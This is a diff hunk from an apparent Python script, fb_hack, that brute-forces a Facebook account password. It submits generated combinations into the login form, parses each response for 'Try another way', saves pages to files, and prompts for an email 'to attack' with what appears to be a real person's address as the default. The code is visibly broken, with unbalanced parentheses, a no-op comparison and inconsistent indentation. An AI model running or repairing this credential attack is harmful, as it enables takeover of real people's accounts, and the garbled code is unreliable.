@@ -83,26 +83,29 @@ def fb_hack(email, codex):
     if counter < codex:
       x = (''.join(map(str, combination)))
       codex += 1
-    try:
-      x = (''.join(map(str, combination)))
-      browser.form['pass'] = x
-      test = (x, " failed")
-      sleepy(30)
-      counter += 1
-      yo = h.join(test)
-      response1 = browser.response()
-      soup = BeautifulSoup(response1, 'html.parser')
-      z = soup.find(string("Try another way")
-      if z == "None":
+    else:
+      try:
+        x = (''.join(map(str, combination)))
+        browser.form['pass'] = x
+        test = (x, " failed")
+        sleepy(30)
+        counter += 1
+        yo = h.join(test)
+        response1 = browser.response()
+        soup = BeautifulSoup(response1, 'html.parser')
+        z = soup.find(string("Try another way")
+        if z == "None":
           raise
-    except:
-      response1 = browser.response()
-      soup = BeautifulSoup(response1, 'html.parser')
-      with open("output1.html", "w") as file:
+        else:
+          z ==1         
+      except:
+        response1 = browser.response()
+        soup = BeautifulSoup(response1, 'html.parser')
+        with open("output1.html", "w") as file:
+          file.write(str(soup))
+        with open("output1.txt", "w") as file:
         file.write(str(soup))
-      with open("output1.txt", "w") as file:
-        file.write(str(soup))
-      print(counter)
+        print(counter)
 
 os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
